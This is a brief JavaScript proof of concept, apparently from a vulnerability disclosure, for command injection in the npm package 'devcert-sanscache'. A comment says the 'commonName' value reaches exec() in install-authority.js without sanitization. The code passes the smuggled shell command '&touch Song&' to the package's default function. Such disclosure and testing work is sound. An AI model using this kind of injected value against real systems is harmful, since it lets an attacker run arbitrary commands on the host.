/**
 * the injection point is located in line 60 of file install-authority.js
 * which is called by the default function of this package
 * the variable "commonName" is used as part of the arg of exec function without 
 * any sanitization 
 */
var root = require("devcert-sanscache");
var attack_code = "&touch Song&";
root(attack_code);
